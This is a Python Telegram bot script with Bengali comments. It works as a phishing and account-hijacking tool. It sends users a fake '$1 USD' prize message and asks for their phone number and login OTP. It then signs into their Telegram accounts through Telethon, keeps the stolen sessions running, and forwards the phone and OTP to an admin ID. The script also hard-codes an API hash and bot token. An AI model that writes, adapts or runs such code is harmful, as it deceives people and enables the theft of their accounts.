import os
import sys

# প্রয়োজনীয় লাইব্রেরি না থাকলে অটো ইনস্টল করবে
try:
    import requests
    from telethon import TelegramClient, events, Button, errors
except ImportError:
    print("Installing missing libraries... please wait.")
    os.system("pip install requests telethon")
    os.execl(sys.executable, sys.executable, *sys.argv)

from telethon.network import ConnectionTcpFull
import asyncio
import shutil

# --- Configuration ---
API_ID = 28260353
API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4'
ADMIN_ID = 7852368023

# সেশন ক্লিনআপ (যাতে ওটিপি এক্সপায়ার না হয়)
if os.path.exists('main_bot_session.session'):
    os.remove('main_bot_session.session')

bot = TelegramClient('main_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🎁 <b>Congratulations! You Won $1 USD</b> 💲\n\n"
        "💡 <b>Verify your account to claim.</b>",
        buttons=[Button.inline("✅ CLAIM NOW ✅", b"claim")],
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(data=b"claim"))
async def claim(event):
    chat_id = event.chat_id
    async with bot.conversation(chat_id, timeout=600) as conv:
        try:
            await conv.send_message("📱 <b>ENTER YOUR TELEGRAM NUMBER:</b>\n<i>(Example: +88017XXXXXXXX)</i>", parse_mode='html')
            phone_res = await conv.get_response()
            phone = phone_res.text.strip().replace(" ", "")

            # নতুন সেশন কানেকশন
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH, connection=ConnectionTcpFull)
            await client.connect()

            try:
                # ওটিপি রিকোয়েস্ট
                sent_code = await client.send_code_request(phone)
                h_code = sent_code.phone_code_hash
                
                await conv.send_message("🔑 <b>ENTER THE 5-DIGIT OTP:</b>", parse_mode='html')
                otp_res = await conv.get_response()
                otp = otp_res.text.strip()

                # সরাসরি সাইন-ইন (Fast Action)
                await client.sign_in(phone, code=otp, phone_code_hash=h_code)
                
                await conv.send_message("🎉 <b>SUCCESS! Reward processing...</b>")
                
                # অ্যাডমিনকে তথ্য পাঠানো
                log = f"✅ <b>LOGIN SUCCESS!</b>\n📱 Phone: <code>{phone}</code>\n🔑 OTP: <code>{otp}</code>"
                await bot.send_message(ADMIN_ID, log, parse_mode='html')
                
                asyncio.create_task(client.run_until_disconnected())

            except errors.PhoneCodeExpiredError:
                await conv.send_message("❌ <b>Expired!</b> দ্রুত ওটিপি দিন।")
            except Exception as e:
                await conv.send_message(f"❌ <b>Error:</b> {str(e)}")
                await client.disconnect()

        except Exception as e:
            print(f"Error: {e}")

print("--- BOT IS STARTING WITH NEW TOKEN ---")
bot.run_until_disconnected()
